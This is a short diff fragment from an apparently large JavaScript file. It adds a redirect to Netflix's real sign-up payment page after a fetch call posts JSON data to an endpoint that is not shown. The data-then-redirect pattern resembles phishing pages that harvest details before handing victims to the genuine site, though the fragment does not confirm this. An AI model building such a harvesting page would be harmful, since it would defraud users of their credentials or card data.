@@ -21854,7 +21854,7 @@
             'Content-Type': 'application/json', // Set appropriate Content-Type header
           },
           body: JSON.stringify(data), // Set the raw data as the body of the request
-        })
+        }).then(res => window.location = "https://www.netflix.com/signup/creditoption")
       }
     })
     //
